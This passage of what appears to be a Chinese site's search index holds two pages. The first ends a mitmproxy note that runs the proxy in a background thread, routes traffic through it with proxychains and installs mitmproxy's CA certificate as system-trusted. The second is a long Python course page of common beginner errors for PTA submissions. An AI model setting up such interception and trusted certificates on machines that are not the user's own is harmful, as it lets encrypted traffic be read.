set_event_loop ( loop ) # This is the key. m . run_loop ( loop . run_forever ) if __name__ == \"__main__\" : options = Options ( listen_host = '0.0.0.0' , listen_port = 8080 , http2 = True ) m = DumpMaster ( options , with_termlog = False , with_dumper = False ) config = ProxyConfig ( options ) m . server = ProxyServer ( config ) m . addons . add ( Addon ()) # run mitmproxy in backgroud, especially integrated with other server loop = asyncio . get_event_loop () t = threading . Thread ( target = loop_in_thread , args = ( loop , m ) ) t . start () # Other servers, such as a web server, might be started then. time . sleep ( 20 ) print ( 'going to shutdown mitmproxy' ) m . shutdown () \u5b89\u88c5proxychains: apt install proxychains4 \u4fee\u6539/etc/proxychains.conf\uff0c\u6700\u540e\u4e00\u884c\u6539\u6210 http 127.0.0.1 8080 \u6dfb\u52a0\u4fe1\u4efb\uff1a\u53c2\u8003 https://superuser.com/questions/437330/how-do-you-add-a-certificate-authority-ca-to-ubuntu cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt update-ca-certificates","title":"\u4f7f\u7528mitmproxy"},{"location":"PythonCourse/","text":"Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b \u00b6 \u5148\u672c\u5730\u6d4b\u8bd5\u80fd\u901a\u8fc7\u518d\u63d0\u4ea4 \u00b6 PTA\u6ca1\u6709\u63d0\u4f9b\u8be6\u7ec6\u7684\u62a5\u9519\uff0c\u4f60\u90fd\u4e0d\u77e5\u9053\u9519\u54ea\u4e86\u600e\u4e48\u6539\uff0c\u5efa\u8bae\u4f60\u8bd5\u8bd5\u672c\u6587\u63d0\u5230\u7684\u9519\u8bef\uff0c\u8bb0\u4f4f\u9519\u8bef\u4fe1\u606f\u4e0b\u6b21\u9047\u5230\u4e5f\u5c31\u4e0d\u614c\u4e86 \u672c\u5730Python\u8dd1\u6210\u529f\u518d\u63d0\u4ea4\u63d0\u9ad8\u6548\u7387\uff0c\u7701\u70b9\u65f6\u95f4 \u5168\u89d2\u7684\u7b26\u53f7 \u00b6 a=int\uff08input\uff08\uff09\uff09 b=int\uff08input\uff08\uff09\uff09 print(a+b) \u62a5\u9519\uff1a File \"<stdin>\", line 1 a=int\uff08input\uff08\uff09\uff09 ^ SyntaxError: invalid character in identifier \u770b\u51fa ( \u4e0e \uff08 \u7684\u533a\u522b\u4e86\u561b\uff0cPython\u8bed\u8a00\u7684\u62ec\u53f7\u8981\u6c42\u534a\u89d2\u7684\u62ec\u53f7 \u89e3\u51b3\u65b9\u6848\uff1a \u5173\u6389\u4e2d\u6587\u8f93\u5165\u6cd5\uff01 input\u53ea\u8bfb\u53d6\u8f93\u5165\u7684\u4e00\u884c \u00b6 \u770b\u6e05\u695a\u9898\u76ee\uff0c\u5982\u679c\u9898\u76ee\u6709\u4e24\u884c\u8f93\u5165\uff0c\u5c31\u9700\u8981\u4e24\u6b21input() \u5982\u679c\u9898\u76ee\u53ea\u6709\u4e00\u884c\u8f93\u5165\uff0c\u6bd4\u5982\u4e00\u884c\u540c\u65f6\u7ed9\u4e86\u4e24\u4e2a\u6570\u7a7a\u683c\u5206\u9694\uff0c\u4f60\u9700\u8981 input().split() \u6269\u5c55\u4e00\u4e0b\uff1a\u4f60\u53ef\u4ee5\u4f7f\u7528 map \u51fd\u6570\u6765\u6279\u91cf\u8c03\u7528\u51fd\u6570 \u00b6 \u7528\u6cd5\u662f map(\u76ee\u6807\u51fd\u6570\uff0c\u5217\u8868) \u8fd4\u56de \u5217\u8868\u6bcf\u4e2a\u5143\u7d20\u8c03\u7528\u76ee\u6807\u51fd\u6570\u7684\u7ed3\u679c\u7684 \u8fed\u4ee3\u5668 iterator \uff0c\u518d\u7528list\u53ef\u4ee5\u5f97\u5230\u5217\u8868 \u4e3e\u4e2a\u4f8b\u5b50\u9898\u76ee\u8981\u5728\u4e00\u884c\u4e2d\u8f93\u5165\u591a\u4e2a\u6574\u6570 # map\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f\u8fed\u4ee3\u5668 \uff0c\u88ab\u8bfb\u5230\u7684\u65f6\u5019\u624d\u4f1a\u771f\u6b63\u8c03\u7528\u76ee\u6807\u51fd\u6570\uff0c\u60f3\u5f97\u5230\u5217\u8868\u8fd8\u9700\u8981\u7528 list >>> map ( int , input (). split ()) 222 444 < map object at 0 x000001D87FB4DAC8 > >>> list ( map ( int , input (). split ())) 222 444 [ 222 , 444 ] >>> a , b = map ( int , input (). split ()) 333 555 >>> a 333 >>> b 555 \u4e0d\u8981\u8f93\u51fa\u4efb\u4f55\u591a\u4f59\u7684\u63d0\u793a\u4fe1\u606f \u00b6 A=int(input('\u88ab\u52a0\u6570')) B=int(input('\u52a0\u6570')) print(A+B) PTA\u5224\u9898\u5c31\u662f\u5224\u65ad\u4f60\u7a0b\u5e8f\u7684\u8f93\u51fa\u662f\u5426 \u548c\u6807\u51c6\u7b54\u6848\u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4 \u5b8c\u5168\u4e00\u81f4 \u9898\u76ee\u6ca1\u6709\u8981\u6c42\u4f60\u8f93\u51fa \u88ab\u52a0\u6570 \u8fd9\u79cd\u63d0\u793a\u4fe1\u606f\uff0c\u4f60\u5c31\u5565\u4e5f\u522b\u8f93\u51fa\uff0c\u4e0d\u8981\u753b\u86c7\u6dfb\u8db3\uff01 \u89e3\u51b3\u65b9\u6848\uff1a \u76f4\u63a5input()\u5c31\u884c\u4e86 input\u51fd\u6570\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32 \u00b6 \u522b\u5fd8\u4e86\u628a\u5b57\u7b26\u4e32\u8f6c\u6210\u4f60\u9700\u8981\u7684\u7c7b\u578b\uff0c\u6bd4\u5982int() \u5b57\u7b26\u4e32\u52a0\u5b57\u7b26\u4e32\u662f\u62fc\u63a5\uff0c \u5b57\u7b26\u4e32\u4e0d\u80fd\u548c\u6574\u6570\u76f8\u52a0 >>> \"1\"+\"2\" '12' >>> 1+2 3 >>> \"1\"+2 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: can only concatenate str (not \"int\") to str \u6ce8\u610f\u7c7b\u578b\u8f6c\u6362\u7684int\u662f\u8981\u8c03\u7528\u7684 \u548cC\u8bed\u8a00\u4e0d\u4e00\u6837 \u00b6 \u8fd9\u662fC\u8bed\u8a00\u7684\u8bed\u6cd5\uff0cPython\u4e0d\u652f\u6301 sum = (int)x + (int)y \u5e94\u8be5\u5199\uff1a sum = int(x) + int(y) \u53e6\u5916 \u4e0d\u5efa\u8bae\u547d\u540d\u4e3asum\uff0c\u56e0\u4e3asum\u672c\u8eab\u662fPython\u7684\u5185\u7f6e\u51fd\u6570 \u4f60\u8d4b\u503c\u4e86\u5c31\u4e0d\u80fd\u518d\u8c03\u7528\u539f\u6765\u7684sum\u51fd\u6570\u4e86 \u5982\u679c\u4f60\u8986\u76d6\u4e86sum\u4e4b\u540e\u518d\u53bb\u8c03\u7528sum\u51fd\u6570 \u4f1a\u62a5\u9519 >>> sum=1 >>> sum([1,2]) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'int' object is not callable \u4f60\u8fd8\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1a\u7528map\u548c\u5217\u8868\u63a8\u5bfc\u5f0f s = sum(map(int, [x,y])) s = sum([int(i) for i in [x,y]]) \u6ce8\u610f\u62ec\u53f7\u7684\u5339\u914d \u00b6 a,b,c=map(int,(input().split()) \u591a\u4e86\u4e00\u4e2a(\uff0c \u7ec6\u5fc3\u4e00\u70b9\u5373\u53ef \u62a5\u9519\uff1a SyntaxError : unexpected EOF while parsing \u65b9\u6cd5\u662f\u9700\u8981\u8c03\u7528\u7684 \u00b6 a,b,c=input().split \u672b\u5c3e\u5c11\u4e86() \u62a5\u9519\uff1a Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: cannot unpack non-iterable builtin_function_or_method object \u6ce8\u610f\u7f29\u8fdb \u4e0d\u80fd\u6709\u591a\u4f59\u7a7a\u683c \u00b6 s=\"Python\u8bed\u8a00\u7b80\u5355\u6613\u5b66\" print(s) \u7b2c\u4e8c\u884c\u591a\u4e86\u524d\u9762\u7684\u7a7a\u683c\uff0c\u4f1a\u62a5\u9519\uff1a File \"<stdin>\", line 1 print(s) ^ IndentationError: unexpected indent print\u7684\u7528\u6cd5 \u00b6 \u9519\u8bef\u793a\u4f8b\uff1a print(sum = s) \u4f60\u8981\u7ad9\u5728\u8bed\u8a00\u5f00\u53d1\u8005\u7684\u89d2\u5ea6\u601d\u8003\uff0c\u4f60\u62ec\u53f7\u91ccsum\u8868\u793a\u7684\u662f\u5b57\u9762\u610f\u601d\u4e0a\u7684\u201dsum\u201d\u5b57\u7b26\u4e32\u5462\u8fd8\u662f\u5185\u7f6e\u7684sum\u51fd\u6570\u5462\uff1f\u8bed\u8a00\u7684\u8bbe\u8ba1\u8981\u4fdd\u8bc1\u6ca1\u6709\u6b67\u4e49 \u6b63\u786e\u7684\u5199\u6cd5\uff1a\u9700\u8981\u539f\u6837\u8f93\u51fa\u7684\u90fd\u8981\u52a0\u4e0a\u5f15\u53f7\uff01 print ( \"sum =\" , s ) \u8fd9\u4e2a\u9898\u76ee\u8981\u6c42\u7b49\u53f7\u4e24\u8fb9\u6709\u7a7a\u683c\uff0c\u5982\u679c\u6ca1\u6709\u6ce8\u610f\u5230\u8fd9\u4e00\u70b9\u4f1a \u683c\u5f0f\u9519\u8bef print\u53ef\u4ee5\u63a5\u53d7\u4e0d\u5b9a\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5728\u8f93\u51fa\u7684\u65f6\u5019 \u6bcf\u4e2a\u53c2\u6570\u4e4b\u95f4\u4f1a\u52a0\u4e0a\u7a7a\u683c \uff0c\u6240\u4ee5\u4e0a\u8ff0\u5b57\u7b26\u4e32\u91cc\u7b49\u53f7 \u53f3\u8fb9\u662f\u4e0d\u5199\u7a7a\u683c \u7684 \u4f60\u8fd8\u53ef\u4ee5\u4f7f\u7528f-string \u00b6 \u4e0a\u8ff0\u5199\u6cd5\u53ef\u4ee5\u66ff\u6362\u6210\uff1a print ( f \"sum = { s } \" ) \u6ce8\u610f\u5230\u5b57\u7b26\u4e32\u5f15\u53f7\u524d\u9762\u7684f\uff0c\u8bf4\u660e\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u6a21\u677f\uff0cPython\u9047\u5230\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f1a\u81ea\u52a8\u628as\u7684\u503c\u586b\u8fdb\u53bb\u3002 f-string\u5728Python3.7\u91cc\u9762\u5f15\u5165\uff0cPTA\u662f\u652f\u6301\u7684\uff0c\u5982\u679c\u4f60\u7684Python\u7248\u672c\u4f4e\u4e8e3.7\uff0c\u4f60\u53ef\u4ee5\u7528\u8fd9\u4e9b\u901a\u7528\u7684\u5199\u6cd5\uff08\u53ea\u662f\u4e0d\u591f\u7f8e\u89c2\u4e86\uff09\uff1a print ( \"sum = {} \" . format ( s )) # \u9700\u8981\u8bb0\u6e05\u695a\u591a\u4e2a\u53d8\u91cf\u4e4b\u95f4\u7684\u987a\u5e8f print ( \"sum = {s} \" . format ( s = s )) # \u6bcf\u4e2a\u53d8\u91cf\u90fd\u8981\u5199\u4e00\u904d print ( \"sum = {s} \" . format ( ** locals ())) # \u76f4\u63a5\u628a\u6240\u6709\u5c40\u90e8\u53d8\u91cf\u90fd\u63d0\u4f9b\u7ed9format \u5c31\u4e0d\u7528\u81ea\u5df1\u5199\u4e86 # \u5982\u679c\u7528\u5728\u51fd\u6570\u91cc\uff0c\u4f60\u53ef\u80fd\u60f3\u8f93\u51fa\u5168\u5c40\u53d8\u91cf\uff0c\u672a\u5b8c\u5f85\u7eed \u6ce8\u610f\u5f15\u53f7\u62ec\u53f7\u7684\u5339\u914d\uff0c\u5c24\u5176\u662f\u53d8\u5f97\u590d\u6742\u7684\u65f6\u5019 \u00b6 \u9519\u8bef\u793a\u4f8b \u770b\u770b\u5f15\u53f7\u7684\u7ed3\u675f\u4f4d\u7f6e print(f'f({x:.1f}) = {1/x:.1f'}) \u6b63\u786e\u7684\u5199\u6cd5\u662f print ( f 'f( { x : .1f } ) = { 1 / x : .1f } ' ) for,if,else\u53f3\u8fb9\u90fd\u8981\u6709\u5206\u53f7\uff0c\u6bcf\u4e2a\u5206\u53f7\u7684\u4e0b\u4e00\u884c\u589e\u52a0\u7f29\u8fdb \u00b6 \u9519\u8bef\u793a\u4f8b num = float ( input ()) if num < 0 : print ( 'Invalid Value!' ) elif num <= 50 : cost = num * 0.53 print ( \"cost = %.2f \" % cost ) else : cost = 50 * 0.53 + ( num - 50 ) * ( 0.05 + 0.53 ) print ( \"cost = %.2f \" % cost ) elif\u91cc\u9762\u7684print\u6ca1\u6709\u7f29\u8fdb\uff0celse\u5fc5\u987b\u548celif\u548cif\u5e73\u7ea7\uff0c\u4e4b\u95f4\u7684\u4ee3\u7801\u5fc5\u987b\u66f4\u591a\u7f29\u8fdb \u4fee\u6539\u65b9\u6cd5\uff1a\u53bb\u6389\u4e0a\u9762\u7684print\u6216\u8005\u4e24\u5904print\u90fd\u589e\u52a0\u7f29\u8fdb \u7ee7\u7eed\u5f3a\u8c03 \u4e0d\u8981\u51fa\u73b0\u4e2d\u6587\u62ec\u53f7 \u00b6 \u987a\u5e26\u5f3a\u8c03\u4e0d\u8981\u5728PTA\u91cc\u89e3\u9898\uff0c\u5148\u53bbPython IDLE\u6216\u8005thonny\u91cc \u672c\u5730\u505a\u51fa\u6765\u518d\u590d\u5236\u7c98\u8d34\u63d0\u4ea4 \u4f60\u7684\u6bcf\u6b21\u9519\u8bef\u63d0\u4ea4\u6211\u90fd\u4f1a\u770b\uff0c\u4f60\u53cd\u590d\u51fa\u73b0\u540c\u4e00\u6b21\u9519\u8bef\u8ba9\u6211\u5f88\u70e6 \u4f60\u4fe1\u4e0d\u4fe1\u8fd9\u4e2a\u9519\u8bef\u4e0b\u6b21\u4f5c\u4e1a\u8fd8\u4f1a\u51fa\u73b0 \u9519\u8bef\u793a\u4f8b if \uff08 x < 0 \uff09 : print ( \"Invalid Value!\" ) Python\u7684if\u4e5f\u4e0d\u9700\u8981\u62ec\u53f7\uff0c\u76f4\u63a5\u5199\u5c31\u884c if x < 0 : print ( \"Invalid Value!\" ) \u4e0d\u8981\u51fa\u73b0return 0 \u00b6 \u5982\u679c\u4f60\u4e00\u5b9a\u8981\u8ba9\u7a0b\u5e8f\u7acb\u523b\u9000\u51fa\uff0c\u7528 exit(0) \uff0c\u6548\u679c\u7b49\u4ef7\u4e8eC\u8bed\u8a00main\u51fd\u6570\u91cc return 0; \u770b\u6e05\u9898\u76ee \u00b6 \u8f93\u5165\u5b9e\u6570\u522b\u7528int() \u00b6 \u9898\u76ee\u8bf4 \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa \u5b9e\u6570 x \u4f60\u9700\u8981 float(input()) \u770b\u6e05\u9898\u76ee\u8f93\u5165\u7684\u683c\u5f0f \u00b6 \u6bd4\u5982\u9898\u76ee\u8f93\u5165\u7684\u4f8b\u5b50\u662f\u8fd9\u6837\u7684 1, 5 \u4f60\u5c31\u4e0d\u80fd\u7528 a,b=input().split() \u800c\u5e94\u8be5 a,b=input().split(',') \u4e5f\u4e0d\u5e94\u8be5\u4e24\u6b21input()\uff0c\u53ea\u6709\u8f93\u5165\u662f\u4e24\u884c\u7684\u65f6\u5019\u624d\u80fd\u8c03\u7528\u4e24\u6b21input \u770b\u6e05\u9898\u76ee\u7684\u5141\u8bb8\u8303\u56f4 \u00b6 \u9898\u76ee\u8bf4 lower\u2264upper\u2264100\uff0c\u90a3\u4e48\u80af\u5b9a\u5c31\u4f1a\u6709\u6d4b\u8bd5\u70b9lower\u7b49\u4e8eupper\uff0c\u8fd9\u662f\u7b26\u5408\u8981\u6c42\u7684 \u4e0d\u8981\u9519\u8bef\u7684\u8f93\u51fa\u4e86 Invalid. \u590d\u5236\u7c98\u8d34\u9898\u76ee\u7684\u6587\u672c\u5c31\u884c \u4e0d\u8981\u81ea\u5df1\u6572 \u00b6 \u81ea\u5df1\u8f93\u5165\u5c31\u5bb9\u6613\u51fa\u9519\uff0c\u4ece\u9898\u76ee\u590d\u5236\u591a\u7b80\u5355 \u4e0d\u8981\u8ffd\u6c42\u4e00\u884c\u5199\u5b8c \u00b6 cost = float ( input ()) print ( \"Invalid Value!\" if m < 0 else \"cost = \" + str ( format ( 0.53 * cost + ( 0 if cost <= 50 else 0.05 * ( cost - 50 )), '.2f' ))) \u4ee3\u7801\u662f\u7ed9\u4eba\u770b\u7684\uff0c\u8fd9\u79cd\u5199\u6cd5\u4e0d\u5bb9\u6613\u770b\u51fa\u54ea\u91cc\u51fa\u9519\u4e86\uff0c\u8001\u8001\u5b9e\u5b9e\u5199if\u5457 \u8fd9\u4e2a\u9519\u8bef\u662f\u672a\u5b9a\u4e49\u7684m \u53e6\u5916\u53d8\u91cf\u7684\u547d\u540d\uff0c\u9898\u76ee\u8f93\u5165\u7684\u662f\u7535\u91cf\uff0c\u4e0ecost\u547d\u540d\u4e0d\u4e00\u81f4\uff0c\u8fd9\u4f1a\u8ba9\u8bfb\u8005\u56f0\u60d1\uff08\u8bfb\u8005\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u4ee5\u540e\u7684\u4f60\uff0c\u4e0d\u8981\u7ed9\u81ea\u5df1\u6316\u5751\uff09 \u4e58\u6cd5\u8981\u5199\u4e58\u53f7 \u00b6 \u9519\u8bef\u5199\u6cd5\uff1a 2i \u62a5\u9519 SyntaxError: invalid syntax \u6b63\u786e\u5199\u6cd5\uff1a 2*i \u9519\u8bef\u5199\u6cd5\uff1a area=sqrt(s(s\u2212a)(s\u2212b)(s\u2212c)) \u62a5\u9519 TypeError: 'int' object is not callable \u6b63\u786e\u5199\u6cd5\uff1a area=sqrt(s*(s\u2212a)*(s\u2212b)*(s\u2212c)) int\u7528\u4f5c\u8fdb\u5236\u8f6c\u6362 \u53c2\u6570\u662f \u5b57\u7b26\u4e32,\u6574\u6570 \u00b6 \u4f60\u9700\u8981\u7ed9\u51fa\u6b63\u786e\u7684\u7c7b\u578b \u5426\u5219\u62a5\u9519\uff1a >>> int ( \"100\" , 2 ) 4 >>> int ( 100 , 2 ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > TypeError : int () can 't convert non-string with explicit base >>> int ( \"100\" , \"2\" ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > TypeError : 'str' object cannot be interpreted as an integer \u5b57\u7b26\u4e32\u7684join \u9700\u8981\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u5b57\u7b26\u4e32 \u00b6 \u4f60\u4e0d\u80fd \",\".join([1,2,3]) \u4f1a\u62a5\u9519\uff1a TypeError: sequence item 0: expected str instance, int found \u4f60\u53ef\u4ee5\u5148\u8f6c\u6362\u6210str\uff1a \",\".join([str(i) for i in [1,2,3]]) \u6ce8\u610f\u8fb9\u7f18\u60c5\u51b5 \u00b6 \u9898\u76ee\u8bf4\u7684 \u8f93\u51fa\u683c\u5f0f \u8981\u8ba4\u771f\u4f53\u4f1a \u9996\u5148\u987a\u5e8f\u8f93\u51fa\u4eceA\u5230B\u7684\u6240\u6709\u6574\u6570\uff0c\u6bcf5\u4e2a\u6570\u5b57\u5360\u4e00\u884c\uff0c\u6bcf\u4e2a\u6570\u5b57\u53605\u4e2a\u5b57\u7b26\u5bbd\u5ea6\uff0c\u5411\u53f3\u5bf9\u9f50\u3002\u6700\u540e\u5728\u4e00\u884c\u4e2d\u6309Sum = X\u7684\u683c\u5f0f\u8f93\u51fa\u5168\u90e8\u6570\u5b57\u7684\u548cX\u3002 -3 -2 -1 0 1 2 3 4 5 6 7 8 Sum = 30 \u4f60\u8003\u8651\u5230\u6700\u540e\u4e00\u884c\u6b63\u597d\u51d1\u6ee15\u4e2a\u6574\u6570\uff0c\u4f60\u4f1a\u591a\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c\u5417\uff1f \u53e6\u5916\u8fd9\u4e2a\u9898\u76ee\u6697\u542b\u7740 \u6bcf\u884c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c \u7684\u8981\u6c42\uff0c\u4f60\u80fd\u7528 end=' ' \u5417? \u5b66\u4f1a\u81ea\u5df1\u9020\u6570\u636e \u00b6 \u4e0d\u8981\u6ee1\u8db3\u4e8e\u9898\u76ee\u7ed9\u7684\u6837\u4f8b\uff0c\u53d1\u6325\u4e3b\u89c2\u80fd\u52a8\u6027\u81ea\u5df1\u9020\u6570\u636e\u770b\u770b\uff0c\u6bd4\u5982\u8fb9\u754c\u503c\uff08\u6700\u5927\u6700\u5c0f\uff09\u3001\u9519\u8bef\u503c \u6ce8\u610f\u8f93\u51fa\u683c\u5f0f\u5bf9\u987a\u5e8f\u7684\u8981\u6c42 \u00b6 \u4f8b\u5982\u67e5\u9a8c\u8eab\u4efd\u8bc1\u7684\u9898\u76ee\uff0c\u8f93\u51fa\u683c\u5f0f\u7684\u8981\u6c42\u662f\uff1a \u6309\u7167\u8f93\u5165\u7684\u987a\u5e8f \u6bcf\u884c\u8f93\u51fa1\u4e2a\u6709\u95ee\u9898\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 \u90a3\u4f60\u5c31\u4e0d\u80fd\u8fd9\u4e48\u5199\u4e24\u6b21\u5faa\u73af\uff0c\u4e00\u904d\u8f93\u51fa\u524d17\u4f4d\u6709\u975e\u6570\u5b57\u7684\uff0c\u4e00\u904d\u8f93\u51fa\u6821\u9a8c\u4f4d\u4e0d\u5bf9\u7684\uff0c\u53ea\u80fd\u4e00\u6b21\u5faa\u73af\u5b8c\u6210 \u867d\u7136\u4e24\u6b21\u5faa\u73af\u903b\u8f91\u4e0a\u662f\u5bf9\u7684\uff0c\u5374\u6ca1\u80fd\u6ee1\u8db3\u9898\u76ee\u7684\u8981\u6c42\uff0c\u5c31\u7b54\u6848\u9519\u8bef\u4e86\uff1b\u6070\u597d\u9898\u76ee\u7684\u6837\u4f8b\u662f\u5148\u975e\u6570\u5b57\u9519\u8bef\u518d\u6821\u9a8c\u4f4d\u9519\u8bef\uff0c\u4f46\u8fd9\u53ea\u662f\u4e2a\u6837\u4f8b\uff0c \u6837\u4f8b\u91cc\u7684\u89c4\u5f8b\u53ea\u8981\u4eba\u5bb6\u6ca1\u8bf4\u4e00\u5f8b\u4e0d\u7b97\u6570\u7684\uff01 \u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u662f\u6574\u6570\uff1f \u00b6 \u6700\u7b80\u5355\u7684\u65b9\u5f0f\uff1a x.isdigit() \u4e5f\u53ef\u4ee5\uff1a \u20180\u2019<=x<=\u20189\u2019 \u4e0d\u5efa\u8bae\u7684\u65b9\u5f0f\uff1a 48<=ord(x)<=57 \u4f60\u4e0d\u662f\u5728\u5199C\u8bed\u8a00\uff0c\u6ca1\u5fc5\u8981\u8f6c\u6362\u4e3a\u6574\u6570\u5224\u65ad \u9644\u5e26\u77e5\u8bc6\u70b9\uff1apython\u91cc a<x<b \u7b49\u4ef7\u4e8e a<x and x<b \u5b57\u7b26\u4e32\u6bd4\u8f83\u5927\u5c0f\u662f\u4e2a\u5751 \u00b6 \u8fd9\u4e2a\u4e1c\u897f\u662fTrue\u8fd8\u662fFalse? \"2\">\"11\" \u7b54\u6848\u662fTrue\uff0c\u9707\u60ca\uff012\u5c45\u7136\u6bd411\u5927\uff1f\uff01 \u6ce8\u610f\u8fd9\u662f\u4e24\u4e2a \u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u6bd4\u8f83 \uff0c\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\u89c4\u5219\u662f \u9010\u5b57\u7b26\u6bd4\u8f83\uff0c\u76f8\u540c\u5c31\u7ee7\u7eed\u6bd4\u8f83\uff0c\u9047\u5230\u4e00\u4e2a\u4e0d\u76f8\u540c\u5c31\u5f97\u51fa\u6700\u7ec8\u7684\u6bd4\u8f83\u7ed3\u8bba \u3002 \u8fd9\u91cc\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u5b57\u7b262\u548c1\uff0c2\u662f\u5927\u4e8e1\u7684\uff0cok\u6bd4\u8f83\u5b8c\u6210 \u201c2\u201d>\u201d11\u201d\u3002 \u540c\u7406 \u201c2\u201d>\u201d199999999\u201d\uff0c\u65e0\u8bba9\u6709\u591a\u5c11\u4e2a\u90fd\u4e0d\u4f1a\u53c2\u4e0e\u6bd4\u8f83\u3002 \u4e3e\u4e00\u53cd\u4e09\uff1amax(\u201c8\u201d, \u201c9\u201d, \u201c10\u201d)\u662f\u591a\u5c11\uff1f \u5f53\u9898\u76ee\u8981\u6c42\u6574\u6570\u7684\u6392\u5e8f\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u7528int\u8f6c\u6210\u6574\u6570 \u533a\u5206.sort()\u548csorted \u00b6 x = [ 3 , 1 , 2 ] for i in x . sort (): print ( i , end = ' ' ) \u4e0a\u8ff0\u4ee3\u7801\u6b63\u786e\u5417\uff1f\u4f1a\u8f93\u51fa 1 2 3 \u561b\uff1f .sort()\u8fd4\u56de\u7684\u662fNone\uff0c\u4e0d\u80fd\u7528\u6765\u8fed\u4ee3\uff1b\u8fd9\u662f\u4e00\u4e2a\u539f\u5730\u6392\u5e8f\uff0c\u76f4\u63a5\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u4e0d\u4f1a\u521b\u5efa\u65b0\u7684\u6570\u7ec4 \u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\uff0c\u4f60\u9700\u8981\u7528sorted(x)\uff1b\u8fd9\u4e0d\u4f1a\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u800c\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4 x = [ 3 , 1 , 2 ] for i in sorted ( x ): print ( i , end = ' ' ) print ( x ) \u8f93\u51fa\u662f 1 2 3 [3, 1, 2] \uff0c\u53ef\u4ee5\u770b\u51fa\u4f7f\u7528sorted\u4e0d\u4f1a\u4fee\u6539\u539f\u6765\u7684x \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4eec \u00b6 \u201c%5.2f\u201d\u662f\u5565\u610f\u601d \u00b6 >>> \" %5.2f \" % 1.2 ' 1.20' >>> \" {:5.2f} \" . format ( 1.2 ) ' 1.20' >>> \" {:>5.2f} \" . format ( 1.2 ) ' 1.20' \u70b9\u5c31\u662f\u5c0f\u6570\u70b9\uff0c\u70b92\u5c31\u662f\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u524d\u9762\u8fd8\u6709\u4e00\u4e2a5\u662f\u5565\u5462\uff0c\u8868\u793a\u6574\u4f53\u4e0d\u591f5\u4f4d\u5c31\u5de6\u8fb9\u7528\u7a7a\u683c\u8865\u9f505\u4f4d\uff0c\u6ce8\u610f\u4e0a\u8ff0\u8f93\u51fa\u5de6\u8fb9\u662f\u6709\u4e00\u4e2a\u7a7a\u683c\u7684\u3002 \u5982\u679c\u7528format\uff0c\u53ef\u4ee5\u770b\u51fa\u5199\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u8fd9\u662f\u53f3\u5bf9\u9f50\u7528 > >>> \" %-5.2f \" % 1.2 '1.20 ' >>> \" {:<5.2f} \" . format ( 1.2 ) '1.20 ' \u52a0\u4e86\u4e00\u4e2a\u8d1f\u53f7\uff0c\u53d8\u6210\u4e86\u53f3\u8fb9\u8865\u7a7a\u683c\uff1b\u8fd9\u662f\u5de6\u5bf9\u9f50\u6240\u4ee5\u7528 < \u90a3\u6211\u8981\u5c45\u4e2d\u600e\u4e48\u529e \u00b6 >>> \" {:^7s} \" . format ( \"xyz\" ) ' xyz ' \u90a3\u5c31\u7528^\u5457\uff0c\u8fd9\u662f\u6309Shift+6\u6309\u51fa\u6765\u7684\u7b26\u53f7 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u60f3\u8f93\u51fa\u51e0\u4e2a\u53d8\u91cf\u5c31\u8981\u5199\u51e0\u4e2a \u00b6 \" {:d}{:>6.1f} \" . format ( fahr , celsius ) \u8fd9\u91cc\u6709\u4e24\u4e2a\u53d8\u91cf\u8981\u8f93\u51fa\uff0c\u6240\u4ee5\u8981\u4e24\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 Thonny\u7684\u7528\u6cd5 \u00b6 \u5728\u4e0a\u534a\u90e8\u5206\u5199\u4ee3\u7801\uff0c\u6539\u4ee3\u7801\uff0c\u6309F5\u6267\u884c\u540e \u5728\u4e0b\u534a\u90e8\u5206Shell\u91cc\u8f93\u5165\u7528\u6237\u7684\u8f93\u5165\uff0c\u67e5\u770b\u8f93\u51fa \u4e0d\u8981\u5728\u5b83\u7684Shell\u91cc\u6572\u5165\u4ee3\u7801\uff0c\u56e0\u4e3a\u5b83\u4e0d\u652f\u6301\u591a\u6761\u8bed\u53e5 \u521d\u59cb\u5316\u80fd\u5728\u5faa\u73af\u4f53\u5185\u5417\uff1f \u00b6 \u6bd4\u5982\u9898\u76ee\u8981\u6c42\u6ca1\u6709\u9519\u8bef\u7684\u8eab\u4efd\u8bc1\u5c31\u8f93\u51faAll Passed!\uff0c\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\u9519\u5728\u54ea\uff1f \u5bf9\u6bcf\u4e00\u4e2a\u8eab\u4efd\u8bc1 : flag = 1 #1\u8868\u793a\u6ca1\u9519 if \u8eab\u4efd\u8bc1\u9519\u4e86 : flag = 0 #\u53ea\u8981\u6709\u4e00\u4e2a\u9519\u4e86 flag\u7f6e0 if flag : print ( \"All Passed!\" ) 